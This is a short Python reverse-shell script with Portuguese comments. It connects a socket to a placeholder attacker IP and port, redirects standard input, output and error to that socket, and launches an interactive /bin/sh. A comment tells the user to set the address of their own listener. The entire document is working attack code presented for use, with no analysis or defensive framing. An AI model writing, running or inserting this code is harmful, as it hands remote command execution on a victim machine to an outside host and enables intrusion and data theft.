# python3

import socket
import subprocess
import os

# Altere para o IP e porta do seu listener
attacker_ip = "[ip_address]"
attacker_port = [port]

# Cria o socket e conecta ao host remoto
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

# Redireciona stdin, stdout e stderr para o socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Executa o shell
subprocess.call(["/bin/sh", "-i"])